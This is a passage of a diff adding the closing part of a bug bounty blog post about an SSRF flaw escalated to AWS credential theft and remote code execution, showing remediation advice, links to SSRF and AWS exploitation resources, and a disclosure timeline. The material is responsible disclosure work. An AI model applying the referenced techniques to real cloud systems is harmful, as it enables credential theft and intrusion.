+<li>Do not allow private IPs to be called from the proxy and use AWS EC2 Instance Metadata Service Version 2 (IMDSv2) since it <a target="_blank" rel="noopener" href="https://yeswehack.com/redirect?url=https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/&expires=1645125367&token=83b2b191af75c75307a6abd2333daf3f4562cf7e237007ef491d7eb1c08e4d89">blocks most of SSRF attacks</a>.</li>
+<li>Use the lowest privilege system user.</li>
+</ul>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.notion.so/Bug-Bounty-2b00d2f97a424b6285d50b4d468c2003">SSRF Bypass - Hacktricks</a>.</li>
+<li><a target="_blank" rel="noopener" href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">Steal EC2 Metadata Credentials via SSRF</a>.</li>
+<li><a target="_blank" rel="noopener" href="https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530">Just Gopher It: Escalating a Blind SSRF to RCE</a>.</li>
+<li><a target="_blank" rel="noopener" href="https://rzepsky.medium.com/playing-with-cloudgoat-part-5-hacking-aws-with-pacu-6abe1cf5780d">Playing with CloudGoat: hacking AWS with Pacu</a>.</li>
+</ul>
+<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>July 20, 2021 — Reported<br>July 22, 2021 — Status: Accepted<br>July 23, 2021  — Status: Fixed, patch deployed.<br>July 24, 2021  — Contacted the team since the SSRF vulnerability was still present through IP based whitelist bypass and open redirect bypass.<br>July 24, 2021  — Status: Accepted (reopened).<br>August 1, 2021  — Status: Fixed, patch deployed.<br>August 1, 2021 — Rewarded.</p>
+<hr>
+<p>That’s it folks! I hope you liked this new format. As always do not hesitate to contact me for any questions or feedback!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Bug-Bounty/">Bug Bounty</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/AWS/" rel="tag">AWS</a>, <a class="tag-link-link" href="/tags/IAM/" rel="tag">IAM</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-To-AWS-Credentials-Disclosure"><span class="toc-number">2.</span> <span class="toc-text">SSRF To AWS Credentials Disclosure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution"><span class="toc-number">3.</span> <span class="toc-text">Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#via-send-command"><span class="toc-number">3.1.</span> <span class="toc-text">via send-command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#via-UserData"><span class="toc-number">3.2.</span> <span class="toc-text">via UserData</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escalating-privileges"><span class="toc-number">4.</span> <span class="toc-text">Escalating privileges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation-recommendation"><span class="toc-number">5.</span> <span class="toc-text">Remediation recommendation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Timeline"><span class="toc-number">7.</span> <span class="toc-text">Timeline</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
